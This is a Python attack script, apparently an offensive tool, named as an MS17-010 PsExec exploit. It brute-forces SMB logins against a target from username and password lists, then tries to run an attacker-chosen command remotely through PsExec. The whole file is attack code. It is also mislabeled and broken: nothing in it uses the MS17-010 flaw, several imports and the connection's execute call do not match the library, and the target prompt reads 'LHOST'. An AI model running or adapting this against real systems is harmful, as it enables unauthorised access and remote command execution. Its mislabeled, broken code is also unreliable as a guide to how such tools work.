from impacket import smbserver, nmb, version, smbconnection
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.dcerpc import MSRPC, MSRPC_UUID_SAMR
from impacket.dcerpc.dtypes import NULL
from impacket.dcerpc.samr import hSamrConnect, hSamrOpenUser, hSamrLookupNames
from impacket.dcerpc.lsad import hLsarOpenPolicy, hLsarLookupNames, LSAD_LOOKUP_SAM_NAMES
from impacket.dcerpc.lsad import LSAD_POLICY_HND_PA
from impacket.dcerpc.lsad.lsarpc import LsarOpenPolicy, LsarLookupNames, LsarLookupSids
from impacket.dcerpc.lsad.lsarpc import LSARPC_POLICY_ACCESS_ENUM
from impacket.dcerpc.lsad.lsarpc import LSARPC_POLICY_AUDIT_FULL_SET_INFO

def exploit_smb_ms17_010_psexec(target_ip, username_file, password_file, command):
    server = smbserver.SimpleSMBServer()
    server.addShare("SHARE", "/tmp", "")
    server.setSMB2Support(True)
    
    server.start()
    
    nb = nmb.NetBIOS()
    nb.start()
    
    with open(username_file, "r") as file:
        usernames = file.read().splitlines()
    
    with open(password_file, "r") as file:
        passwords = file.read().splitlines()
    
    for username in usernames:
        for password in passwords:
            try:
                smb_connection = smbconnection.SMBConnection(target_ip, "SHARE", sess_port=445)
                
                smb_connection.login(username, password)
                
                psexec_command = f"\\\\{target_ip}\\SHARE\\PsExec.exe /accepteula -s {command}"
                
                smb_connection.execute(psexec_command)
                
                print(f"Exploit successful with username: {username} and password: {password}")
                
                server.stop()
                nb.stop()
                

                return
            
            except Exception as e:
                print(f"Exploit failed with username: {username} and password: {password}")
                print(f"Error: {str(e)}")
    
    server.stop()
    nb.stop()

target_ip = input("LHOST: ")
username_file = input("USERNAME-LIST: ")
password_file = input("PASSLIST: ")
command = input("CMD-COMMAND: ")
exploit_smb_ms17_010_psexec(target_ip, username_file, password_file, command)
